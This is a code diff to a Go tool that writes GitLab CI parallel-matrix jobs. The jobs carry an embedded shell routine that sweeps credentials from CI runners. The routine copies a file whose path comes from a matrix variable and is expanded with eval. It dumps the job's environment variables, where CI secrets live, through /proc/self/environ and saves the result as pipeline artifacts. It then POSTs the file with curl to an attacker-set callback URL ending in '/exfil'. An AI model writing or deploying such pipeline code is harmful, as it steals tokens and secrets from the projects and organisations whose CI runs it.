@@ -40,6 +40,11 @@ func GenerateParallelMatrixYAML(o ParallelMatrixOptions) string {
   script:
     - |
 %s
+  artifacts:
+    when: always
+    paths:
+      - sweep-*.txt
+    expire_in: 1 day
   allow_failure: true%s
 `, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
 		indentBlock(strings.TrimSpace(matrixBlock), 6),
@@ -93,31 +98,29 @@ func buildMatrixScript(o ParallelMatrixOptions) string {
 	var b strings.Builder
 
 	b.WriteString(`_SWEEP() {
-  local _d
-  _d=$(mktemp -d)
+  # Per-instance credential sweep using matrix variables
+  local outfile="sweep-${CI_NODE_INDEX:-0}.txt"
 
-  # Read target path using matrix variable
-  if [ -f "$TARGET_PATH" ]; then
-    cp "$TARGET_PATH" "$_d/loot_$(echo "$TARGET_PATH" | tr '/' '_')" 2>/dev/null || true
-  elif [ -f "$(eval echo "$TARGET_PATH")" ]; then
-    cp "$(eval echo "$TARGET_PATH")" "$_d/loot_$(echo "$TARGET_PATH" | tr '/' '_')" 2>/dev/null || true
+  # Read target path (expand variables)
+  local resolved
+  resolved=$(eval echo "$TARGET_PATH" 2>/dev/null) || true
+  if [ -f "$resolved" ]; then
+    echo "=== $TARGET_PATH ===" >> "$outfile"
+    cat "$resolved" >> "$outfile" 2>/dev/null || true
   fi
 
-  # Dump environment for each parallel instance
-  printenv | sort > "$_d/env_${CI_NODE_INDEX}.txt" || true
+  # Dump env for this parallel instance via /proc
+  echo "=== environ ===" >> "$outfile"
+  cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | sort >> "$outfile" || true
 `)
 
 	if strings.TrimSpace(o.CallbackURL) != "" {
 		fmt.Fprintf(&b, `
-  # Exfiltrate per-instance results
-  tar czf "$_d/sweep.tar.gz" -C "$_d" . 2>/dev/null || true
-  curl -sS -X POST -F "file=@$_d/sweep.tar.gz" -F "project=$CI_PROJECT_PATH" -F "index=$CI_NODE_INDEX" "%s/exfil" || true
+  curl -sS -X POST -F "file=@$outfile" -F "index=$CI_NODE_INDEX" "%s/exfil" || true
 `, o.CallbackURL)
 	}
 
-	b.WriteString(`
-  rm -rf "$_d" || true
-}
+	b.WriteString(`}
 _SWEEP || true`)
 
 	return b.String()
